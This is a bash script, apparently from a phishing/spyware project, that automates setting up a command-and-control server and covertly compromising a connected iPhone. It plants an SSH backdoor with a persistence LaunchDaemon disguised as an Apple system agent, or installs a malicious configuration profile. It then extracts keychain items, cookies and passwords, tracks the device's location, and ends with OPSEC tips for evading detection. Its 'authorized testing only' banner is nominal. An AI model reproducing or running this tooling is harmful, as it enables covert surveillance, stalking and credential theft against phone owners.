#!/bin/bash
# iPhone Remote Access Quick Start Script
# Automates C2 setup and device compromise

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration
C2_PORT=8443
C2_DOMAIN=""
DEVICE_UDID=""
ENCRYPTION_KEY=""

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║     iPhone Remote Access Framework - Quick Start         ║"
echo "║                                                           ║"
echo "║  [!] For authorized security testing only                ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Function to print status
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[!]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[*]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root for some operations"
        print_warning "Run with: sudo $0"
        exit 1
    fi
}

# Install dependencies
install_dependencies() {
    print_status "Installing dependencies..."
    
    # Detect OS
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS
        if ! command -v brew &> /dev/null; then
            print_error "Homebrew not found. Install from https://brew.sh"
            exit 1
        fi
        
        brew install libimobiledevice ideviceinstaller ifuse python3
        
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        apt-get update
        apt-get install -y \
            libimobiledevice-utils \
            libimobiledevice-dev \
            ideviceinstaller \
            ifuse \
            python3 \
            python3-pip \
            usbmuxd \
            openssl \
            nginx \
            certbot
    else
        print_error "Unsupported OS: $OSTYPE"
        exit 1
    fi
    
    # Install Python dependencies
    pip3 install -r requirements.txt
    
    print_status "Dependencies installed successfully"
}

# Generate encryption key
generate_encryption_key() {
    print_status "Generating encryption key..."
    
    ENCRYPTION_KEY=$(python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())")
    
    print_status "Encryption key: $ENCRYPTION_KEY"
    echo "$ENCRYPTION_KEY" > .encryption_key
    chmod 600 .encryption_key
}

# Setup C2 server
setup_c2_server() {
    print_status "Setting up C2 server..."
    
    # Get C2 domain
    read -p "Enter C2 domain (e.g., c2.example.com): " C2_DOMAIN
    
    if [[ -z "$C2_DOMAIN" ]]; then
        print_error "C2 domain is required"
        exit 1
    fi
    
    # Generate SSL certificate
    print_status "Generating SSL certificate for $C2_DOMAIN..."
    
    if command -v certbot &> /dev/null; then
        certbot certonly --standalone -d "$C2_DOMAIN" --non-interactive --agree-tos --email admin@$C2_DOMAIN
    else
        print_warning "Certbot not found, generating self-signed certificate..."
        openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes \
            -subj "/CN=$C2_DOMAIN"
    fi
    
    # Configure nginx
    print_status "Configuring nginx reverse proxy..."
    
    cat > /etc/nginx/sites-available/c2 <<EOF
server {
    listen 443 ssl http2;
    server_name $C2_DOMAIN;
    
    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    location / {
        proxy_pass http://127.0.0.1:$C2_PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    
    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;
}
EOF
    
    ln -sf /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
    nginx -t && systemctl reload nginx
    
    # Configure firewall
    print_status "Configuring firewall..."
    
    if command -v ufw &> /dev/null; then
        ufw allow 443/tcp
        ufw allow 22/tcp
        ufw --force enable
    fi
    
    print_status "C2 server configured successfully"
}

# Start C2 server
start_c2_server() {
    print_status "Starting C2 server..."
    
    # Create systemd service
    cat > /etc/systemd/system/iphone-c2.service <<EOF
[Unit]
Description=iPhone C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/home/haymayndz/MaxPhisher
ExecStart=/usr/bin/python3 /home/haymayndz/MaxPhisher/c2_server.py server
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable iphone-c2
    systemctl start iphone-c2
    
    print_status "C2 server started"
    print_status "Check status: systemctl status iphone-c2"
}

# Detect connected iPhone
detect_iphone() {
    print_status "Detecting connected iPhone..."
    
    # Check for connected devices
    DEVICES=$(idevice_id -l)
    
    if [[ -z "$DEVICES" ]]; then
        print_error "No iPhone detected"
        print_warning "Connect iPhone via USB and trust this computer"
        exit 1
    fi
    
    # Get first device UDID
    DEVICE_UDID=$(echo "$DEVICES" | head -n 1)
    
    print_status "Found device: $DEVICE_UDID"
    
    # Get device info
    print_status "Device information:"
    ideviceinfo -u "$DEVICE_UDID" | grep -E "(DeviceName|ProductVersion|ProductType)"
}

# Compromise device
compromise_device() {
    print_status "Compromising device: $DEVICE_UDID"
    
    # Check jailbreak status
    print_status "Checking jailbreak status..."
    
    JAILBROKEN=false
    if ideviceinfo -u "$DEVICE_UDID" | grep -qi "jailbreak"; then
        JAILBROKEN=true
        print_status "Device is jailbroken"
    else
        print_warning "Device is not jailbroken"
    fi
    
    # Choose compromise method
    if [[ "$JAILBROKEN" == true ]]; then
        print_status "Using SSH backdoor method..."
        compromise_jailbroken
    else
        print_status "Using configuration profile method..."
        compromise_non_jailbroken
    fi
}

# Compromise jailbroken device
compromise_jailbroken() {
    print_status "Installing SSH backdoor..."
    
    # Test SSH connectivity
    if ssh -p 22 root@localhost "echo test" 2>/dev/null; then
        print_status "SSH access confirmed"
    else
        print_error "SSH not accessible"
        print_warning "Ensure OpenSSH is installed on device"
        return 1
    fi
    
    # Upload agent
    print_status "Uploading device agent..."
    scp -P 22 iphone_agent.py root@localhost:/var/root/
    
    # Create LaunchDaemon
    print_status "Creating persistence mechanism..."
    
    cat > /tmp/com.apple.system.agent.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/var/root/iphone_agent.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
    
    scp -P 22 /tmp/com.apple.system.agent.plist root@localhost:/Library/LaunchDaemons/
    ssh -p 22 root@localhost "launchctl load /Library/LaunchDaemons/com.apple.system.agent.plist"
    
    print_status "SSH backdoor installed successfully"
}

# Compromise non-jailbroken device
compromise_non_jailbroken() {
    print_status "Generating configuration profile..."
    
    python3 <<EOF
from iphone_remote_access import iPhoneBackdoorInstaller

installer = iPhoneBackdoorInstaller("$DEVICE_UDID")
profile_path = installer.create_configuration_profile("https://$C2_DOMAIN")
print(f"Profile created: {profile_path}")
EOF
    
    print_warning "Manual installation required:"
    print_warning "1. Open Apple Configurator 2"
    print_warning "2. Select device: $DEVICE_UDID"
    print_warning "3. Add > Profiles > Select generated .mobileconfig"
    print_warning "4. Install profile on device"
    
    read -p "Press Enter when profile is installed..."
}

# Extract credentials
extract_credentials() {
    print_status "Extracting credentials from device..."
    
    python3 <<EOF
import asyncio
from iphone_remote_access import iPhoneBackdoorInstaller

installer = iPhoneBackdoorInstaller("$DEVICE_UDID")
credentials = installer.extract_credentials()

print("[+] Extracted credentials:")
print(f"  Keychain items: {len(credentials.get('keychain', {}))}")
print(f"  Cookies: {len(credentials.get('cookies', {}))}")
print(f"  Passwords: {len(credentials.get('passwords', {}))}")

# Save credentials
import json
with open('extracted_credentials.json', 'w') as f:
    json.dump(credentials, f, indent=2)

print("[+] Credentials saved to: extracted_credentials.json")
EOF
}

# Test C2 connection
test_c2_connection() {
    print_status "Testing C2 connection..."
    
    python3 <<EOF
import asyncio
from iphone_remote_access import iPhoneRemoteControl

async def test():
    controller = iPhoneRemoteControl(
        c2_server="https://$C2_DOMAIN",
        encryption_key="$ENCRYPTION_KEY"
    )
    
    # Register device
    await controller.compromise_device("$DEVICE_UDID")
    
    # Test command
    location = await controller.track_location("$DEVICE_UDID")
    print(f"[+] Device location: {location}")
    
    await controller.close()

asyncio.run(test())
EOF
    
    print_status "C2 connection test complete"
}

# Display summary
display_summary() {
    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              Deployment Complete                         ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}C2 Server:${NC} https://$C2_DOMAIN"
    echo -e "${GREEN}Device UDID:${NC} $DEVICE_UDID"
    echo -e "${GREEN}Encryption Key:${NC} $ENCRYPTION_KEY"
    echo ""
    echo -e "${YELLOW}Next Steps:${NC}"
    echo "1. Monitor devices: python3 c2_server.py"
    echo "2. Execute commands: python3 -c 'from c2_server import C2Client; ...'"
    echo "3. View exfiltrated data: ls -la exfiltrated_data/"
    echo ""
    echo -e "${YELLOW}Management:${NC}"
    echo "- Start C2: systemctl start iphone-c2"
    echo "- Stop C2: systemctl stop iphone-c2"
    echo "- View logs: journalctl -u iphone-c2 -f"
    echo ""
    echo -e "${RED}[!] OPSEC Reminder:${NC}"
    echo "- Use VPN/Tor for all C2 access"
    echo "- Rotate C2 infrastructure regularly"
    echo "- Clean up traces after operations"
    echo "- Encrypt all exfiltrated data"
    echo ""
}

# Main execution
main() {
    echo ""
    print_status "Starting iPhone Remote Access deployment..."
    echo ""
    
    # Menu
    echo "Select deployment mode:"
    echo "1) Full deployment (C2 + Device compromise)"
    echo "2) C2 server only"
    echo "3) Device compromise only"
    echo "4) Test existing setup"
    echo ""
    read -p "Choice [1-4]: " choice
    
    case $choice in
        1)
            check_root
            install_dependencies
            generate_encryption_key
            setup_c2_server
            start_c2_server
            detect_iphone
            compromise_device
            extract_credentials
            test_c2_connection
            display_summary
            ;;
        2)
            check_root
            install_dependencies
            generate_encryption_key
            setup_c2_server
            start_c2_server
            print_status "C2 server deployed"
            ;;
        3)
            detect_iphone
            compromise_device
            extract_credentials
            print_status "Device compromised"
            ;;
        4)
            if [[ -f .encryption_key ]]; then
                ENCRYPTION_KEY=$(cat .encryption_key)
            else
                print_error "Encryption key not found"
                exit 1
            fi
            
            read -p "Enter C2 domain: " C2_DOMAIN
            detect_iphone
            test_c2_connection
            ;;
        *)
            print_error "Invalid choice"
            exit 1
            ;;
    esac
}

# Run main
main
